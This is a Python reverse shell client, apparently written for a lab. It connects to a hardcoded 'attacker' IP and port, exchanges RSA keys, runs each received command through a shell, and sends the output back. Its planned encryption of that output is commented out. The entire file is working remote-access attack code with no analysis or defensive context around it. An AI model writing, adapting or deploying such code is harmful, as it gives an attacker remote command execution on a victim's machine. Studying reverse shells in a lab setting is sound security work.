# pylint: disable=bare-except
import socket
import subprocess
import os
from cryptidy import asymmetric_encryption

HOST = '10.0.2.4'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
print(f'target priv key: {priv_key}')
print(f'target pub key: {pub_key}')
s.send(pub_key.encode())

attacker_pub_key = s.recv(1024).decode()
print(f'attacker pub key: {attacker_pub_key}')

try:
    while True:
        attacker_input = s.recv(1024).decode().split(' ')
        print(f"attacker_input: {attacker_input}")
        if attacker_input == 'exit':
            s.close()
            break
        elif attacker_input[0] == 'cd':
            if len(attacker_input) != 2:
                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
            else:
                os.chdir(attacker_input[1])
                s.send(b'\n')
        elif len(attacker_input) > 0:
            result = subprocess.run(' '.join(attacker_input), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
            s.send(result.stdout)
            # encrypted_data = asymmetric_encryption.encrypt_message(attacker_input, pub_key)
            # encrypted_data_b64 = encrypted_data.encode()
            # s.send(encrypted_data_b64)
        else:
            s.send(b' ')
except:
    s.close()
